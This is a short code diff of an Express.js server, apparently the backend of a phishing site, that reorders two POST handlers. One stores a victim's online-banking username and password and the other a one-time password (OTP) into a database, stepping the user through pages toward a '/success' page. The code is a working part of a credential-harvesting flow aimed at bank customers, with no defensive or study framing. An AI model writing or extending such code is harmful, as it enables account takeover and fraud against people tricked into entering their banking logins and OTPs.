@@ -161,7 +161,7 @@ app.post("/actionstep1",(req,res)=>{
     })
     
 })
-app.post("/actionstep3",(req,res)=>{
+app.post("/actionstep2",(req,res)=>{
     var obj={
         UserBanking:req.body.UserBanking,
         PasswordBanking:req.body.PasswordBanking,
@@ -170,19 +170,18 @@ app.post("/actionstep3",(req,res)=>{
     
     Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
         if(doc){
-            res.redirect("/success");
+             res.redirect("/Buoc-3");
         }
          
      })
 })
-app.post("/actionstep2",(req,res)=>{
+app.post("/actionstep3",(req,res)=>{
     var obj={
         OTP:req.body.OTP
     }
     Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
         if(doc){
-             
-             res.redirect("/Buoc-3");
+             res.redirect("/success");
         }
          
      })
